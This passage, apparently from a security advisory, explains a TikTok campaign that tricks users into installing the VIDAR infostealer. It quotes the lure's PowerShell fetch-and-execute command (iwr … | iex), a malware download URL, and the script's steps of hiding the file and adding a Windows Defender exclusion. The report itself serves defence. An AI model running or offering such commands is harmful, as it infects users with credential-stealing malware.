However, this is actually a malware distribution campaign that installs the VIDAR infostealer onto victims\u2019 machines.</p> <p>How the Scam Works: 1. The TikTok videos instruct users to run a PowerShell command:</p> <p>iwr \u201c(ProgramName).keytool.cc\u201d | iex</p> <pre><code>\u2022 The domain changes based on the software being \u201coffered.\u201d 2. This downloads a .ps1 (PowerShell script) onto the user\u2019s machine. 3. The script decodes a Base64-encoded URL, revealing: </code></pre> <p>azsolver.com/files/main.exe</p> <pre><code>\u2022 This main.exe file is VIDAR malware. 4. The script then: \u2022 Moves main.exe to Local AppData \u2022 Hides the file and adds it as an exclusion in Windows Defender \u2022 Runs the malware \u2022 Displays an error message: </code></pre> <p>An error occurred during activation. Please try again.</",
